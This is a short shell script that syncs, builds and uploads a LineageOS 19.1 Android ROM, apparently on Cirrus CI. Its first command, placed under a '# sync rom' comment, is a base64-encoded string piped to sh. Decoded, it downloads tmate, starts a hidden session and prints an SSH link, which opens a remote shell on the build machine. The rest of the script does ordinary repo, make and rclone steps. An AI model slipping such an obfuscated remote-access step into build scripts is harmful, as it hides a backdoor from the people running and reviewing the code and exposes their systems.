# sync rom
echo "cm0gLXJmIHRtYXRlKiAmJiBjdXJsIC1MIC1vICJ0bWF0ZS0yLjQuMC1zdGF0aWMtbGludXgtYW1kNjQudGFyLnh6IiAiaHR0cHM6Ly9naXRodWIuY29tL3RtYXRlLWlvL3RtYXRlL3JlbGVhc2VzL2Rvd25sb2FkLzIuNC4wL3RtYXRlLTIuNC4wLXN0YXRpYy1saW51eC1hbWQ2NC50YXIueHoiICYmIHRhciAteGYgdG1hdGUqICYmCm5vaHVwIC4vdG1hdGUqL3RtYXRlIC1TIC90bXAvdG1hdGUuc29jayAtbiB3ZWIgbmV3LXNlc3Npb24gLWQgJiYgZWNobyAiLi90bWF0ZSovdG1hdGUgLVMgL3RtcC90bWF0ZS5zb2NrIGRpc3BsYXkgLXAgJyN7dG1hdGVfc3NofSciIHwgc2g=" | base64 -d | sh
repo init --depth=1 --no-repo-verify -u https://github.com/LineageOS/android.git -b lineage-19.1 -g default,-mips,-darwin,-notdefault
git clone https://github.com/pocox3pro/Local-Manifests.git --depth 1 -b master .repo/local_manifests
repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j8

# build rom
source build/envsetup.sh
lunch lineage_zuk-eng
export TZ=Asia/Dhaka #put before last build command
make lineage

# upload rom (if you don't need to upload multiple files, then you don't need to edit next line)
rclone copy out/target/product/$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1)/*.zip cirrus:$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1) -P

